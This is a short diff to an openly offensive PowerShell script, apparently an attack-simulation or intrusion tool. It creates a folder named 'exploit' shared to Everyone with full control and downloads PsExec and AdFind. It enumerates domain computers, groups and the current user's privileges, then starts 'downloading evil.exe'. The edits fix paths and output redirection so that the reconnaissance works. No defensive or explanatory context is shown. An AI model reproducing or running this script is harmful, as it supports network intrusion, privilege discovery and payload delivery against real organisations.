@@ -1,6 +1,6 @@
 "Downloading PsExec"
 
-$staticPath= "~\exploit"
+$staticPath= "c:\exploit"
 mkdir $staticPath
 net share ShareName=$staticPath /grant:Everyone,FULL
 
@@ -37,12 +37,12 @@ Invoke-WebRequest -UseBasicParsing -Uri $adfindUrl `
 -ContentType "application/x-www-form-urlencoded" `
 -Body "download=AdFind.zip&email=&B1=Download+Now"  -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $adfindPath
-./adfind/adfind.exe -f "objectcategory=computer" > "./../computers.txt"
+./adfind/adfind.exe -f "objectcategory=computer" > c:/exploit/computers.txt
 
 $user = whoami
 "Checking up the domain"
 net group /domain > group_domains.txt
-whoami /groups user_group.txt
+whoami /groups > user_group.txt
 
 "downloading evil.exe"
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
